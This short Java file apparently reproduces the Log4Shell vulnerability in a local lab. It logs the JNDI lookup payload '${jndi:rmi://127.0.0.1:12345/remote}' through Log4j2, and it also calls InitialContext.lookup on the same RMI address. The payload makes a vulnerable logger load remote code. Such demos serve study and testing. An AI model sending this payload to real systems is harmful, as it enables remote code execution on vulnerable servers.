import javax.naming.InitialContext;
import javax.naming.NamingException;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @author: ryan_scy@126.com
 * @date: 2023-02-12
 * @time: 20:43
 * @desc:
 */
public class Log4j2Client {

    public static void main(String[] args) throws NamingException {
        Log4j2Client log4j2Client = new Log4j2Client();
//        log4j2Client.lookup();
        log4j2Client.jndi();
    }

    public void lookup() throws NamingException {
        InitialContext initialContext=new InitialContext();
        initialContext.lookup("rmi://127.0.0.1:12345/remote");
    }

    public void jndi() {
        Logger logger = LogManager.getLogger(Log4j2Client.class);
        logger.error("${jndi:rmi://127.0.0.1:12345/remote}");
    }
}
